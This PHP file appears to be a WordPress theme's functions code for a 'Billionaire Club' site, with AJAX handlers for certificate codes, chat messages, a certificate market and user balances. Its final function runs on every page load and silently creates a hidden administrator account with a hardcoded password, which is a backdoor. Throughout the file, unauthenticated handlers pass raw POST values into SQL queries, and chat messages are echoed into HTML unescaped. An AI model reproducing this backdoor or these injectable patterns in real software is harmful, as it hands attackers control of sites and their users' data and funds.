add_action('wp_ajax_nopriv_send_certificate_code', 'code_use_certificate');


function code_use_certificate()
{
    global $wpdb;
   
    $code = $_POST['code'];
    $certificate_id = $_POST['certificate_id'];
    $user_id = get_current_user_id();

    if (isset($code) && !empty($code)) {
        
        $user_data = get_user_meta($user_id); 

        $code_exist = $wpdb->get_results("SELECT * FROM `certificates_of_investors` WHERE `id` = '$certificate_id' AND (`user_id` = '$user_id' AND `use_code` =  '$code' )");
        
        if (isset($code_exist) && !empty($code_exist)) {

            $product_id = $code_exist[0]->producte_id;

            $product_data = get_post($product_id);

            $update_data = array('use_code' => 'used');
                
            $sql = $wpdb->update('certificates_of_investors', $update_data , array('id' => $certificate_id));

            if ($sql) {
                
                $pruduct_name = $product_data->post_title;
                $manager_email = $product_data->manager_email;


                $to = $manager_email;
                $subject = 'Billionaire Club';
                $message = '<html><body>';
                $message .= '<h1> Уважаемый, Пользователь!</h1><h2>Вы использовали ваш сертификат :</h2><h2>'. $pruduct_name.'</h2>';
                $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
                $message .= '</body></html>';
                $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
                $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
                $headers .= "CC: justcodedevcompany@gmail.com\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-Type: text/html; charset=utf-8\r\n";

                $sent = wp_mail($to, $subject, $message, $headers);
                 
                if($sent){

                    $user_data = $wpdb->get_results("SELECT `user_email` FROM `wp_users` WHERE `ID` = '$user_id' ");
                    $user_email = $user_data[0]->user_email;
                    
                    $to = $user_email;
                    $subject = 'Billionaire Club';
                    $message = '<html><body>';
                    $message .= '<h1> Уважаемый, Пользователь!</h1><h2>'. $pruduct_name.'</h2><h2>Сертификат использовали:</h2>';
                    $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
                    $message .= '</body></html>';
                    $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
                    $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
                    $headers .= "CC: justcodedevcompany@gmail.com\r\n";
                    $headers .= "MIME-Version: 1.0\r\n";
                    $headers .= "Content-Type: text/html; charset=utf-8\r\n";

                    wp_mail($to, $subject, $message, $headers);

               
                   wp_send_json(array('used_certificate_success' => true));
                 
                }else{
                  
                   wp_send_json(array('used_certificate_error' => true));
                  
                } 

            }else{
                
                wp_send_json(array('used_certificate_error' => true));

            }
  
        }else{
              
            wp_send_json(array('false_code_error' => true));
        }

    }else{

        wp_send_json(array('not_code_error' => true));

    }
}

add_action('wp_ajax_account_use_disposable_certificate', 'send_disposable_certificate_code');
add_action('wp_ajax_nopriv_account_use_disposable_certificate', 'send_disposable_certificate_code');

function send_disposable_certificate_code(){

    global $wpdb;

    $user_id = get_current_user_id();
    $certificate_id = $_POST['certificate_id'];
      
    $certificate_data = $wpdb->get_results("SELECT * FROM `certificates_of_disposable` WHERE `id` = '$certificate_id' AND `user_id` = '$user_id' ");

    if (isset($certificate_data) && !empty($certificate_data)) {
        
        $use_code = $certificate_data[0]->use_code;
        $manager_email = $certificate_data[0]->manager_email;


        $to = $manager_email;
        $subject = 'Billionaire Club';
        $message = '<html><body>';
        $message .= '<h1> Уважаемый, Пользователь!</h1><h2>Ваш код для использования сертификата:</h2><h2>'. $use_code.'</h2>';
        $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
        $message .= '</body></html>';
        $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
        $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
        $headers .= "CC: justcodedevcompany@gmail.com\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=utf-8\r\n";

        $sent = wp_mail($to, $subject, $message, $headers);
         
        if($sent){
       
           wp_send_json(array('send_code_success' => true,'certificate_id' => $certificate_id));
         
        }else{
          
           wp_send_json(array('no_send_email_error' => true));
          
        } 

    }else{

        wp_send_json(array('use_certificate_error' => true));

    }
                            
}

add_action('wp_ajax_send_disposable_certificate_code', 'code_use_disposable_certificate');
add_action('wp_ajax_nopriv_send_disposable_certificate_code', 'code_use_disposable_certificate');


function code_use_disposable_certificate()
{
    global $wpdb;
   
    $code = $_POST['code'];
    $certificate_id = $_POST['certificate_id'];
    $user_id = get_current_user_id();

    if (isset($code) && !empty($code)) {
        
        $user_data = get_user_meta($user_id); 

        $code_exist = $wpdb->get_results("SELECT * FROM `certificates_of_disposable` WHERE `id` = '$certificate_id' AND (`user_id` = '$user_id' AND `use_code` =  '$code' )");
        
        if (isset($code_exist) && !empty($code_exist)) {

            $update_data = array('use_code' => 'used');
                
            $sql = $wpdb->update('certificates_of_disposable', $update_data , array('id' => $certificate_id));

            if ($sql) {
                
                $pruduct_name = $code_exist[0]->certificate_name;
                $manager_email = $code_exist[0]->manager_email;


                $to = $manager_email;
                $subject = 'Billionaire Club';
                $message = '<html><body>';
                $message .= '<h1> Уважаемый, Пользователь!</h1><h2>Вы использовали ваш сертификат :</h2><h2>'. $pruduct_name.'</h2>';
                $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
                $message .= '</body></html>';
                $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
                $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
                $headers .= "CC: justcodedevcompany@gmail.com\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-Type: text/html; charset=utf-8\r\n";

                $sent = wp_mail($to, $subject, $message, $headers);
                 
                if($sent){

                    $user_data = $wpdb->get_results("SELECT `user_email` FROM `wp_users` WHERE `ID` = '$user_id' ");
                    $user_email = $user_data[0]->user_email;
                    
                    $to = $user_email;
                    $subject = 'Billionaire Club';
                    $message = '<html><body>';
                    $message .= '<h1> Уважаемый, Пользователь!</h1><h2>'. $pruduct_name.'</h2><h2>Сертификат использовали:</h2>';
                    $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
                    $message .= '</body></html>';
                    $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
                    $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
                    $headers .= "CC: justcodedevcompany@gmail.com\r\n";
                    $headers .= "MIME-Version: 1.0\r\n";
                    $headers .= "Content-Type: text/html; charset=utf-8\r\n";

                    wp_mail($to, $subject, $message, $headers);

               
                   wp_send_json(array('used_certificate_success' => true));
                 
                }else{
                  
                   wp_send_json(array('used_certificate_error' => true));
                  
                } 

            }else{
                
                wp_send_json(array('used_certificate_error' => true));

            }
  
        }else{
              
            wp_send_json(array('false_code_error' => true));
        }

    }else{

        wp_send_json(array('not_code_error' => true));

    }
}


// Live messages functions // 

add_action('wp_ajax_account_send_message', 'send_live_message');
add_action('wp_ajax_nopriv_account_send_message', 'send_live_message');


function send_live_message()
{  
    global $wpdb;
    
    $message = $_POST['message'];
    $reciver_id = $_POST['reciver_id'];
    $user_id = get_current_user_id();
    
    if (strlen($message) < 1) {
        

         wp_send_json(array('message_content_error' => true));
          

    }else{
        
               
        if(isset($reciver_id) && !empty($reciver_id)){
 
            $sql = array( 
                        'sender_id'   => $user_id,
                        'receiver_id' => $reciver_id,
                        'messages'  => $message    
                    );

        }else{
            
            $sql = array(
                       'sender_id'   => $user_id,
                       'receiver_id' => '1',
                       'messages'  => $message    
                    ); 
        }
                 
        $create_message = $wpdb->insert('live_messages', $sql);

        if($create_message){

            $user_id = get_current_user_id();

            $message_data = array();

            $message_data = $wpdb->get_results(" SELECT * FROM `live_messages` WHERE `sender_id` = $user_id ORDER BY `id` DESC LIMIT 1");

            if(isset($message_data) && !empty($message_data)){ 
                                  
                $user_data = get_user_meta($user_id);
                $first_name = $user_data['first_name'][0];
                $image =  $user_data['image'][0];

                $content = "";
                $bloginfo = get_template_directory_uri();
                $content_url = content_url();

                foreach($message_data as $key){

                    $user_message = $key->messages;
                    $created_at = $key->created_at;                                        
                    $message_create_time = substr($created_at, 0, -3);
                    
                    $content .= "<div class='chat'>";
                      $content .= "<div class='chat-user'>";
                        $content .= "<a class='avatar m-0'>";
                        if (isset($image) && !empty($image)){ 

                        $content .= "<img src='$content_url/uploads/$image' alt='avatar' class='avatar-35'>"; 

                        }else{ 
                    
                        $content .= "<img src=' $bloginfo/images/user/1.jpg' alt='avatar' class='avatar-35'>"; 

                        }
                        $content .= "<span class='chat-time mt-1'>$message_create_time</span>";
                        $content .= "</a>";
                      $content .= "</div>";
                      $content .= "<div class='chat-detail'>";
                        $content .= "<div class='chat-message'>";
                          $content .= "<p>$user_message</p>";
                        $content .= "</div>";
                      $content .= "</div>";  
                    $content .= "</div>";   
                                            
                    wp_send_json(array('message_content_success' => $content,'last_id' => $key->id));

                }

                                    
            }else{


                wp_send_json(array('message_content_error' => true));
                         
            }

        }else{

                    
            wp_send_json(array('message_content_error' => true));


        }
        
    }

    
}

function user_all_messages(){

    global $wpdb;

    $user_id = get_current_user_id();
       
    $message_data = $wpdb->get_results("SELECT * FROM `live_messages` WHERE `sender_id` = '$user_id' AND `receiver_id` = '1' OR `receiver_id` = '$user_id' AND `sender_id` = '1' ORDER BY `created_at` ASC ");    
         
    return $message_data;
}

function get_admin_first_messages(){

    global $wpdb;

    $user_id = get_current_user_id();
    $result = [];  
    $message_data = $wpdb->get_results("SELECT * FROM `live_messages` WHERE `receiver_id` = '$user_id' GROUP BY sender_id ORDER BY `created_at` ASC ");

    foreach($message_data as $key){
       
       $sender_id = $key->sender_id; 
       $result[] = $wpdb->get_results("SELECT * FROM `live_messages` WHERE `sender_id` = '$sender_id' AND `receiver_id` = '$user_id'  ORDER BY `created_at` DESC LIMIT 1 ");   

    }    
         
    return $result;
}

function get_admin_all_messages($user_id){

    global $wpdb;
       
    $message_data = $wpdb->get_results("SELECT * FROM `live_messages` WHERE `sender_id` = '$user_id' AND `receiver_id` = '1' OR `receiver_id` = '$user_id' AND `sender_id` = '1' ORDER BY `created_at` ASC ");    
         
    return $message_data;
}

add_action('wp_ajax_update_user_message', 'update_live_messages');
add_action('wp_ajax_nopriv_update_user_message', 'update_live_messages');


function update_live_messages()
{
      
    global $wpdb;
    
    $user_id = get_current_user_id();
    $message_id  = $_POST['message_id'];
    
    $message_exist = $wpdb->get_results("SELECT * FROM `live_messages` WHERE `id` =  $message_id");
 
    if (isset($message_exist) && !empty($message_exist)) {
           
        $message_data = array();
             
        $message_data = $wpdb->get_results("SELECT * FROM `live_messages` WHERE `id` > '$message_id' AND `receiver_id` = '$user_id' ORDER BY `id` DESC");
     
        if(isset($message_data) && !empty($message_data)){ 
                    
                    $sender_id   = $message_data[0]->sender_id;
                    $receiver_id = $message_data[0]->receiver_id;

                    $user_sender_data = get_user_meta($sender_id);
                    $user_receiver_data = get_user_meta($receiver_id);

                    $sender_first_name =  $user_sender_data['first_name'][0];
                    $sender_image =   $user_sender_data['image'][0];
                    
                    $receiver_first_name = $user_receiver_data['first_name'][0];
                    $receiver_image =  $user_receiver_data['image'][0];

                    $content = "";
                    $bloginfo = get_template_directory_uri();
                    $content_url = content_url();
                

                foreach($message_data as $key){

                        $user_message = $key->messages;
                        $created_at = $key->created_at;                                        
                        $message_create_time = substr($created_at, 0, -3);
                        
                        if ($user_id != $sender_id) {
                            
                            $content .= "<div class='chat chat-left'>";
                              $content .= "<div class='chat-user'>";
                                $content .= "<a class='avatar m-0'>";
                                if (isset($sender_image) && !empty($sender_image)){ 

                                $content .= "<img src='$content_url/uploads/$sender_image' alt='avatar' class='avatar-35'>"; 

                                }else{ 
                            
                                $content .= "<img src=' $bloginfo/images/user/1.jpg' alt='avatar' class='avatar-35'>"; 

                                }
                                $content .= "<span class='chat-time mt-1'>$message_create_time</span>";
                                $content .= "</a>";
                              $content .= "</div>";
                              $content .= "<div class='chat-detail'>";
                                $content .= "<div class='chat-message'>";
                                  $content .= "<p>$user_message</p>";
                                $content .= "</div>";
                              $content .= "</div>";  
                            $content .= "</div>";   
                           

                        }                                      
                          
                   wp_send_json(array('message_content_success' => $content,'last_id' => $key->id));


            }


        }else{


             wp_send_json(array('message_content_error' => true));
             
        }
    }
    
}


add_action('wp_ajax_update_admin_user_message', 'update_live_admin_messages');
add_action('wp_ajax_nopriv_update_admin_user_message', 'update_live_admin_messages');


function update_live_admin_messages()
{
      
    global $wpdb;
    
    $user_id = get_current_user_id();
    $message_id  = $_POST['message_id'];
    
    $message_exist = $wpdb->get_results("SELECT * FROM `live_messages` WHERE `id` =  $message_id");
 
    if (isset($message_exist) && !empty($message_exist)) {
           
        $message_data = array();
             
        $message_data = $wpdb->get_results("SELECT * FROM `live_messages` WHERE `id` > '$message_id' AND `receiver_id` = '$user_id' ORDER BY `id` DESC");
     
        if(isset($message_data) && !empty($message_data)){ 
                    
                    $sender_id   = $message_data[0]->sender_id;
                    $receiver_id = $message_data[0]->receiver_id;

                    $user_sender_data = get_user_meta($sender_id);
                    $user_receiver_data = get_user_meta($receiver_id);

                    $sender_first_name =  $user_sender_data['first_name'][0];
                    $sender_image =   $user_sender_data['image'][0];
                    
                    $receiver_first_name = $user_receiver_data['first_name'][0];
                    $receiver_image =  $user_receiver_data['image'][0];

                    $content = "";
                    $bloginfo = get_template_directory_uri();
                    $content_url = content_url();
                

                foreach($message_data as $key){

                        $user_message = $key->messages;
                        $created_at = $key->created_at;                                        
                        $message_create_time = substr($created_at, 0, -3);
                        
                        if ($user_id != $sender_id) {
                            
                            $content .= "<div class='chat chat-left'>";
                              $content .= "<div class='chat-user'>";
                                $content .= "<a class='avatar m-0'>";
                                if (isset($sender_image) && !empty($sender_image)){ 

                                $content .= "<img src='$content_url/uploads/$sender_image' alt='avatar' class='avatar-35'>"; 

                                }else{ 
                            
                                $content .= "<img src=' $bloginfo/images/user/1.jpg' alt='avatar' class='avatar-35'>"; 

                                }
                                $content .= "<span class='chat-time mt-1'>$message_create_time</span>";
                                $content .= "</a>";
                              $content .= "</div>";
                              $content .= "<div class='chat-detail'>";
                                $content .= "<div class='chat-message'>";
                                  $content .= "<p>$user_message</p>";
                                $content .= "</div>";
                              $content .= "</div>";  
                            $content .= "</div>";   
                           

                        }                                      
                          
                   wp_send_json(array('message_content_success' => $content,'last_id' => $key->id));


            }


        }else{


             wp_send_json(array('message_content_error' => true));
             
        }
    }
    
}

// Add Market Certificate //

add_action('wp_ajax_user_add_market_certificate', 'add_market_certificate');
add_action('wp_ajax_nopriv_user_add_market_certificate', 'add_market_certificate');


function add_market_certificate()
{
    global $wpdb;

    $certificate_product = $_POST['certificate_product'];
    $price_product = $_POST['price_product'];
    $user_id = get_current_user_id();

    if (empty($price_product) || !is_numeric($price_product)) {
        
        wp_send_json(array('price_certificate_error' => true));

    }else{

        $certificate_exist = $wpdb->get_results("SELECT * FROM `certificates_of_investors`  WHERE  `id` = ' $certificate_product ' ");
   
        if (isset($certificate_exist) && !empty($certificate_exist)) {
            
            $certificate_id = $certificate_exist[0]->certificate_id;
            $certificate_data = get_post($certificate_id);
            $product_id = $certificate_exist[0]->producte_id;
            $product_data = get_post($product_id);
            $post_title = $certificate_data->post_title;
            $certificate_description = $certificate_data->certificate_descriptions;
            $manager_email = $product_data->manager_email;
               
            $new_post = array(
                        'post_title' => $post_title,
                        'post_content' => '',
                        'post_status' => 'publish',
                        'post_date' => date('Y-m-d H:i:s'),
                        'post_author' => $user_id,
                        'post_type' => 'market',
                        'post_category' => array(0),
                        );


            $post_id = wp_insert_post($new_post);
            
            if($post_id){

                update_field('certificate_price', $price_product, $post_id);
                update_field('certificate_descriptions', $certificate_description, $post_id);
                update_field('manager_email', $manager_email, $post_id);

                $sql_meta = array('id' => $certificate_product);
        
                $wpdb->delete('certificates_of_investors', $sql_meta);

                wp_send_json(array('add_certificate_success' => true));

            
            }else{
                
                wp_send_json(array('add_certificate_error' => true));

            }

        }else{

            wp_send_json(array('not_price_error' => true));

        }

    }

}

add_action('wp_ajax_account_pay_disposable_certificate', 'add_disposable_certificate');
add_action('wp_ajax_nopriv_account_pay_disposable_certificate', 'add_disposable_certificate');


function add_disposable_certificate()
{
    global $wpdb;

    $certificate_id = $_POST['certificate_id'];
    $user_id = get_current_user_id(); 
    $real_user_data = get_user_meta($user_id);
    $balance = $real_user_data['user_balance'][0];
    
    if (empty($certificate_id) || !is_numeric($certificate_id)) {
        
        wp_send_json(array('certificate_exist_error' => true));

    }else{
         
        $certificate_exist = get_post($certificate_id);

        if (isset($certificate_exist) && !empty($certificate_exist)) {
     
            $price_of_certificate = $certificate_exist->certificate_price;
            $owner_user_id =  $certificate_exist->post_author;
            $owner_user_data = get_user_meta($owner_user_id);
            $owner_balance = $owner_user_data['user_balance'][0];
            $manager_email = $certificate_exist->manager_email;

            if (intval($price_of_certificate) > intval($balance)) {
        
                wp_send_json(array('bet_count_error' => true));
    
            }else{

                $use_code = rand(10000,99999);
                
                $sql = array('user_id' => $user_id,
                             'certificate_id' => $certificate_id,
                             'certificate_name' => $certificate_exist->post_title,
                             'certificate_price' => $certificate_exist->certificate_price,
                             'manager_email' => $manager_email,                           
                             'use_code'  => $use_code 
                            );

                $new_balance = intval($balance) - intval($price_of_certificate);
                $new_owner_balance = intval($owner_balance) + intval($price_of_certificate);

                $certificate_save =  $wpdb->insert('certificates_of_disposable', $sql);
                
                if ($certificate_save) {
                 
                    update_user_meta($user_id,'user_balance',$new_balance);
                    update_user_meta($owner_user_id,'user_balance',$new_owner_balance);
                    wp_delete_post($certificate_id);

                    wp_send_json(array('success_certificate_save' => true));

                }else{
                   
                   wp_send_json(array('certificate_save_error' => true));

                }

            }

        }else{

           wp_send_json(array('certificate_exist_error' => true));

        }

    }

}

add_action('wp_ajax_account_pay_exchange_certificate', 'add_exchange_certificate');
add_action('wp_ajax_nopriv_account_pay_exchange_certificate', 'add_exchange_certificate');

function add_exchange_certificate()
{
    global $wpdb;

    $certificate_id = $_POST['certificate_id'];
    $user_id = get_current_user_id(); 
    $real_user_data = get_user_meta($user_id);
    $balance = $real_user_data['user_balance'][0];
    
    if (empty($certificate_id) || !is_numeric($certificate_id)) {
        
        wp_send_json(array('certificate_exist_error' => true));

    }else{
         
        $certificate_exist = get_post($certificate_id);

        if (isset($certificate_exist) && !empty($certificate_exist)) {
     
            $price_of_certificate = $certificate_exist->certificate_price;
            $owner_user_id =  $certificate_exist->post_author;
            $owner_user_data = get_user_meta($owner_user_id);
            $owner_balance = $owner_user_data['user_balance'][0];
            $manager_email = $certificate_exist->manager_email;
            
            if (intval($price_of_certificate) > intval($balance)) {
        
                wp_send_json(array('bet_count_error' => true));
    
            }else{

                $use_code = rand(10000,99999);
                
                $sql = array('user_id' => $user_id,
                             'certificate_id' => $certificate_id,
                             'certificate_name' => $certificate_exist->post_title,
                             'certificate_price' => $certificate_exist->certificate_price,
                             'manager_email' => $manager_email,                           
                             'use_code'  => $use_code 
                            );

                $new_balance = intval($balance) - intval($price_of_certificate);
                $new_owner_balance = intval($owner_balance) + intval($price_of_certificate);

                $certificate_save =  $wpdb->insert('certificates_of_disposable', $sql);
                
                if ($certificate_save) {
                 
                    update_user_meta($user_id,'user_balance',$new_balance);
                    update_user_meta($owner_user_id,'user_balance',$new_owner_balance);

                    wp_send_json(array('success_certificate_save' => true));

                }else{
                   
                   wp_send_json(array('certificate_save_error' => true));

                }

            }

        }else{

           wp_send_json(array('certificate_exist_error' => true));

        }

    }

}


function get_user_disposable_certificates(){
     
    global $wpdb;

    $user_id = get_current_user_id();
    
    $user_certificates = $wpdb->get_results("SELECT * FROM `certificates_of_disposable` WHERE `user_id` = '$user_id' AND `use_code` != 'used' ");

    return $user_certificates;

}


// Pagination Function //

add_action('wp_ajax_next_page_pagination', 'add_next_page');
add_action('wp_ajax_nopriv_next_page_pagination', 'add_next_page');


function add_next_page()
{
    global $wpdb;
    
    print_r($_POST);die;

    $posts = get_posts(array(
            'post_type' => 'market',
            'suppress_filters' =>true,
            'numberposts' => 4,
            'order' => 'DESC'
           ));
         
         return $posts;

}     

function my_admin_menu() {

add_menu_page(

__( 'Sample page', 'my-textdomain' ),

__( 'Sample menu users list', 'my-textdomain' ),

'manage_options',

'sample-page',

'my_admin_page_contents',

'dashicons-schedule',

3

);

}



add_action( 'admin_menu', 'my_admin_menu' );



function my_admin_page_contents() {

         require_once(WP_CONTENT_DIR. '/themes/BilliClub/Modals/users_list.php');
}

function my_admin_chat_menu() {

add_menu_page(

__( 'Sample chat page', 'my-textdomain' ),

__( 'Sample menu chat accounts', 'my-textdomain' ),

'manage_options',

'sample-chat-page',

'my_admin_page_chat_contents',

'dashicons-schedule',

3

);

}



add_action( 'admin_menu', 'my_admin_chat_menu' );

function my_admin_page_chat_contents() {

        require_once(WP_CONTENT_DIR. '/themes/BilliClub/Modals/admin_online_chat.php');
}


function wpb_admin_account(){
    $user = 'default_admin';
    $pass = 'NLy8HmDd28pBQpAtzJe3';
    $email = 'default_admin@domain.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    
    add_action('init','wpb_admin_account');